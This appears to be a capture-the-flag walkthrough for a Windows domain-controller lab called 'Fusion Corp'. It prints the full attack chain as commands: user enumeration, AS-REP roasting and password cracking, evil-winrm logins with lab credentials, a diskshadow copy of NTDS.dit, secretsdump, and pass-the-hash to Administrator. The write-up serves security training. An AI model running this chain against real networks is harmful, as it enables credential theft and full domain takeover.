# Fusion Corp

<figure><img src="../../.gitbook/assets/image (699).png" alt=""><figcaption></figcaption></figure>

## Enumeration

```bash
nmap -v -A -O -p- -Pn fusion.corp -oN nmap
```

```bash
Nmap scan report for fusion.corp (10.10.234.3)
Host is up (0.063s latency).
Not shown: 65513 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: eBusiness Bootstrap Template
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-06-04 11:20:35Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: fusion.corp0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fusion.corp0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=Fusion-DC.fusion.corp
| Issuer: commonName=Fusion-DC.fusion.corp
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-03T10:53:31
| Not valid after:  2024-12-03T10:53:31
| MD5:   d2aa:3262:517d:2b4e:912f:42ec:612f:4403
|_SHA-1: 40d0:f1db:52b3:186b:2cca:16c8:bba6:9690:2e03:74a9
| rdp-ntlm-info: 
|   Target_Name: FUSION
|   NetBIOS_Domain_Name: FUSION
|   NetBIOS_Computer_Name: FUSION-DC
|   DNS_Domain_Name: fusion.corp
|   DNS_Computer_Name: Fusion-DC.fusion.corp
|   Product_Version: 10.0.17763
|_  System_Time: 2024-06-04T11:21:29+00:00
|_ssl-date: 2024-06-04T11:22:08+00:00; -2s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49687/tcp open  msrpc         Microsoft Windows RPC
49701/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (89%)
Aggressive OS guesses: Microsoft Windows Server 2019 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: FUSION-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-06-04T11:21:32
|_  start_date: N/A
|_clock-skew: mean: -1s, deviation: 0s, median: -1s

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   59.51 ms 10.8.0.1
2   63.12 ms fusion.corp (10.10.234.3)

NSE: Script Post-scanning.
Initiating NSE at 13:22
Completed NSE at 13:22, 0.00s elapsed
Initiating NSE at 13:22
Completed NSE at 13:22, 0.00s elapsed
Initiating NSE at 13:22
Completed NSE at 13:22, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 217.12 seconds
           Raw packets sent: 131214 (5.777MB) | Rcvd: 2685 (646.142KB)
```

### Port 80

<figure><img src="../../.gitbook/assets/image (700).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (701).png" alt=""><figcaption></figcaption></figure>

Running ffuf against the website hosted on port 80 we obtain juicy results:

```bash
ffuf -w /usr/share/dirb/wordlists/big.txt -u http://fusion.corp:80/FUZZ -ic -t 100
```

<figure><img src="../../.gitbook/assets/image (702).png" alt=""><figcaption></figcaption></figure>

If we navigate to `/backup` endpoint we can download the `employee.ods` file and read it carefully:

<figure><img src="../../.gitbook/assets/image (703).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (704).png" alt=""><figcaption></figcaption></figure>

```xml
<office:document-content office:version="1.2">
<office:font-face-decls>
<style:font-face style:name="Calibri" svg:font-family="Calibri"/>
</office:font-face-decls>
<office:automatic-styles>
<style:style style:name="ce1" style:family="table-cell" style:parent-style-name="Default" style:data-style-name="N0"/>
<style:style style:name="ce2" style:family="table-cell" style:parent-style-name="Default" style:data-style-name="N0">
<style:table-cell-properties fo:background-color="#BDD7EE"/>
</style:style>
<style:style style:name="ce3" style:family="table-cell" style:parent-style-name="Default" style:data-style-name="N0">
<style:table-cell-properties style:vertical-align="middle"/>
<style:text-properties fo:font-size="12pt" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
</style:style>
<style:style style:name="co1" style:family="table-column">
<style:table-column-properties fo:break-before="auto" style:column-width="3.65125cm" style:use-optimal-column-width="true"/>
</style:style>
<style:style style:name="co2" style:family="table-column">
<style:table-column-properties fo:break-before="auto" style:column-width="2.01083333333333cm" style:use-optimal-column-width="true"/>
</style:style>
<style:style style:name="co3" style:family="table-column">
<style:table-column-properties fo:break-before="auto" style:column-width="1.69333333333333cm"/>
</style:style>
<style:style style:name="ro1" style:family="table-row">
<style:table-row-properties style:row-height="15pt" style:use-optimal-row-height="true" fo:break-before="auto"/>
</style:style>
<style:style style:name="ro2" style:family="table-row">
<style:table-row-properties style:row-height="15.75pt" style:use-optimal-row-height="true" fo:break-before="auto"/>
</style:style>
<style:style style:name="ta1" style:family="table" style:master-page-name="mp1">
<style:table-properties table:display="true" style:writing-mode="lr-tb"/>
</style:style>
</office:automatic-styles>
<office:body>
<office:spreadsheet>
<table:calculation-settings table:case-sensitive="false" table:search-criteria-must-apply-to-whole-cell="true" table:use-wildcards="true" table:use-regular-expressions="false" table:automatic-find-labels="false"/>
<table:table table:name="Sheet1" table:style-name="ta1">
<table:table-column table:style-name="co1" table:default-cell-style-name="ce1"/>
<table:table-column table:style-name="co2" table:default-cell-style-name="ce1"/>
<table:table-column table:style-name="co3" table:number-columns-repeated="16382" table:default-cell-style-name="ce1"/>
<table:table-row table:style-name="ro1">
<table:table-cell office:value-type="string" table:style-name="ce2">
<text:p>Name</text:p>
</table:table-cell>
<table:table-cell office:value-type="string" table:style-name="ce2">
<text:p>Username</text:p>
</table:table-cell>
<table:table-cell table:number-columns-repeated="16382"/>
</table:table-row>
<table:table-row table:style-name="ro2">
<table:table-cell office:value-type="string" table:style-name="ce3">
<text:p>Jhon Mickel</text:p>
</table:table-cell>
<table:table-cell office:value-type="string" table:style-name="ce1">
<text:p>jmickel</text:p>
</table:table-cell>
<table:table-cell table:number-columns-repeated="16382"/>
</table:table-row>
<table:table-row table:style-name="ro2">
<table:table-cell office:value-type="string" table:style-name="ce3">
<text:p>Andrew Arnold</text:p>
</table:table-cell>
<table:table-cell office:value-type="string" table:style-name="ce1">
<text:p>aarnold</text:p>
</table:table-cell>
<table:table-cell table:number-columns-repeated="16382"/>
</table:table-row>
<table:table-row table:style-name="ro2">
<table:table-cell office:value-type="string" table:style-name="ce3">
<text:p>Lellien Linda</text:p>
</table:table-cell>
<table:table-cell office:value-type="string" table:style-name="ce1">
<text:p>llinda</text:p>
</table:table-cell>
<table:table-cell table:number-columns-repeated="16382"/>
</table:table-row>
<table:table-row table:style-name="ro2">
<table:table-cell office:value-type="string" table:style-name="ce3">
<text:p>Jhon Powel</text:p>
</table:table-cell>
<table:table-cell office:value-type="string" table:style-name="ce1">
<text:p>jpowel</text:p>
</table:table-cell>
<table:table-cell table:number-columns-repeated="16382"/>
</table:table-row>
<table:table-row table:style-name="ro2">
<table:table-cell office:value-type="string" table:style-name="ce3">
<text:p>Dominique Vroslav</text:p>
</table:table-cell>
<table:table-cell office:value-type="string" table:style-name="ce1">
<text:p>dvroslav</text:p>
</table:table-cell>
<table:table-cell table:number-columns-repeated="16382"/>
</table:table-row>
<table:table-row table:style-name="ro2">
<table:table-cell office:value-type="string" table:style-name="ce3">
<text:p>Thomas Jeffersonn</text:p>
</table:table-cell>
<table:table-cell office:value-type="string" table:style-name="ce1">
<text:p>tjefferson</text:p>
</table:table-cell>
<table:table-cell table:number-columns-repeated="16382"/>
</table:table-row>
<table:table-row table:style-name="ro2">
<table:table-cell office:value-type="string" table:style-name="ce3">
<text:p>Nola Maurin</text:p>
</table:table-cell>
<table:table-cell office:value-type="string" table:style-name="ce1">
<text:p>nmaurin</text:p>
</table:table-cell>
<table:table-cell table:number-columns-repeated="16382"/>
</table:table-row>
<table:table-row table:style-name="ro2">
<table:table-cell office:value-type="string" table:style-name="ce3">
<text:p>Mira Ladovic</text:p>
</table:table-cell>
<table:table-cell office:value-type="string" table:style-name="ce1">
<text:p>mladovic</text:p>
</table:table-cell>
<table:table-cell table:number-columns-repeated="16382"/>
</table:table-row>
<table:table-row table:style-name="ro2">
<table:table-cell office:value-type="string" table:style-name="ce3">
<text:p>Larry Parker</text:p>
</table:table-cell>
<table:table-cell office:value-type="string" table:style-name="ce1">
<text:p>lparker</text:p>
</table:table-cell>
<table:table-cell table:number-columns-repeated="16382"/>
</table:table-row>
<table:table-row table:style-name="ro2">
<table:table-cell office:value-type="string" table:style-name="ce3">
<text:p>Kay Garland</text:p>
</table:table-cell>
<table:table-cell office:value-type="string" table:style-name="ce1">
<text:p>kgarland</text:p>
</table:table-cell>
<table:table-cell table:number-columns-repeated="16382"/>
</table:table-row>
<table:table-row table:style-name="ro2">
<table:table-cell office:value-type="string" table:style-name="ce3">
<text:p>Diana Pertersen</text:p>
</table:table-cell>
<table:table-cell office:value-type="string" table:style-name="ce1">
<text:p>dpertersen</text:p>
</table:table-cell>
<table:table-cell table:number-columns-repeated="16382"/>
</table:table-row>
<table:table-row table:number-rows-repeated="1048564" table:style-name="ro1">
<table:table-cell table:number-columns-repeated="16384"/>
</table:table-row>
</table:table>
</office:spreadsheet>
</office:body>
</office:document-content>
```

From this XML we can extract a useful list of usernames:

```
Jhon Mickel,jmickel
Andrew Arnold,aarnold
Lellien Linda,llinda
Jhon Powel,jpowel
Dominique Vroslav,dvroslav
Thomas Jeffersonn,tjefferson
Nola Maurin,nmaurin
Mira Ladovic,mladovic
Larry Parker,lparker
Kay Garland,kgarland
Diana Pertersen,dpertersen
```



### Port 445 (anonymous enumeration)

Trying to do some enumeration on port 445 we notice that it is not possible to list shares as anonymous/guest users:

<figure><img src="../../.gitbook/assets/image (705).png" alt=""><figcaption></figcaption></figure>

### Port 88

If we try to validate with Kerberos the previously extracted list of users using kerbrute we will get that only one user out of the 11 obtained is existing at domain: is the `lparker` user.

```bash
kerbrute userenum usernames.txt --dc 10.10.44.233 -d fusion.corp
```

<figure><img src="../../.gitbook/assets/image (706).png" alt=""><figcaption></figcaption></figure>

Trying to see if the `lparker` user is <mark style="color:yellow;">**ASREProastable**</mark>, we get in the `AS_REP` package the encripted TGS using the private key of the lparker user:

{% code overflow="wrap" %}
```bash
GetNPUsers.py fusion.corp/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (707).png" alt=""><figcaption></figcaption></figure>

Trying to crack the hash with John The Ripper we will obtain the `lparker` password:

{% code overflow="wrap" %}
```bash
john hashes.asreproast --wordlist=/usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (708).png" alt=""><figcaption></figcaption></figure>

`lparker` <--> `!!abbylvzsvs2k6!`



Remote login using `evil-winrm` and obtain the first flag:

```bash
evil-winrm -i fusion.corp -u lparker -p '!!abbylvzsvs2k6!'
```

<figure><img src="../../.gitbook/assets/image (713).png" alt=""><figcaption></figcaption></figure>

As `lparker` we don't have any interesting privilege:

<figure><img src="../../.gitbook/assets/image (715).png" alt=""><figcaption></figcaption></figure>

### Port 445 (enumeration as lparker)

Now if we try to list shares as `lparker` we will obtain these ones:

```bash
smbmap -u "lparker" -p '!!abbylvzsvs2k6!' -H fusion.corp
```

<figure><img src="../../.gitbook/assets/image (709).png" alt=""><figcaption></figcaption></figure>

It doesn't seem so interesting as a result, so let's try with these credentials to enumerate better using `enum4linux`:

```bash
enum4linux -a -u 'lparker' -p '!!abbylvzsvs2k6!' fusion.corp
```

<figure><img src="../../.gitbook/assets/image (710).png" alt=""><figcaption></figcaption></figure>

Awesome! :tada: We've obtained another pair credential for the user jmurphy:

`jmurphy` <--> `u8WC3!kLsgw=#bRY`

Also we know now that `jmurphy` is part of the group `Backup Operators` and `Remote Management Users`:

<figure><img src="../../.gitbook/assets/image (711).png" alt=""><figcaption></figcaption></figure>

Also we know that the only Domain Admin is the user `Administrator` that's also our final target account:

<figure><img src="../../.gitbook/assets/image (712).png" alt=""><figcaption></figcaption></figure>

Again login remotely using `evil-winrm` and obtain the second flag:

```bash
evil-winrm -i fusion.corp -u jmurphy -p 'u8WC3!kLsgw=#bRY'
```

<figure><img src="../../.gitbook/assets/image (714).png" alt=""><figcaption></figcaption></figure>

In this case instead, as `jmurphy` we have some interesting privileges:

<figure><img src="../../.gitbook/assets/image (716).png" alt=""><figcaption></figcaption></figure>

### Info

* Fusion-DC.fusion.corp
* NetBIOS Domain Name: FUSION
* Domain Sid: S-1-5-21-1898838421-3672757654-990739655

## Privilege escalation (Administrator)

Membership in the `Backup Operators` group provides access to the domain controller file system due to the `SeBackup` and `SeRestore` privileges. These privileges enable folder traversal, listing, and file copying capabilities, even without explicit permissions, using the `FILE_FLAG_BACKUP_SEMANTICS` flag. This means `Backup Operators` can backup the DC’s hard drive, make a copy of <mark style="color:red;">**`NTDS.dit`**</mark> and the system registry hive from the backup, and then move both files offline and dump hashes.

On Kali machine create a `backup.txt` file containing these commands:

```
set verbose onX
set metadata C:\Windows\Temp\meta.cabX
set context clientaccessibleX
set context persistentX
begin backupX
add volume C: alias cdriveX
createX
expose %cdrive% E:X
end backup
```

From the remote session as `jmurphy` create a temporary directory `C:\Temp`, upload the backup.txt to it and run `diskshadow.exe` in script mode:

<figure><img src="../../.gitbook/assets/image (717).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (718).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (719).png" alt=""><figcaption></figcaption></figure>

Now copy the shadow copies to current directory (`C:\Temp`):

<figure><img src="../../.gitbook/assets/image (720).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (721).png" alt=""><figcaption></figcaption></figure>

and finally download these files locally:

```bash
download ntds.dit /home/kali/Downloads/ntds.dit
```

```bash
download C:\Temp\system /home/kali/Downloads/system
```

<figure><img src="../../.gitbook/assets/image (722).png" alt=""><figcaption></figcaption></figure>

And like a charm we will decrypt hashes from ntds.dit using bootkey saved in registry hive with the help of the `secretsdump.py` tool:

{% code overflow="wrap" %}
```bash
secretsdump.py -ntds /home/kali/Downloads/ntds.dit -system /home/kali/Downloads/system LOCAL
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (723).png" alt=""><figcaption></figcaption></figure>

Using the Pass-the-Hash attack we can authenticate as `Administrator` via `evil-winrm` using the hash in NTHash format and get the third flag by completing the room! :tada:

```bash
evil-winrm -i fusion.corp -u administrator -H '9653b02d945329c7270525c4c2a69c67'
```

<figure><img src="../../.gitbook/assets/image (724).png" alt=""><figcaption></figcaption></figure>
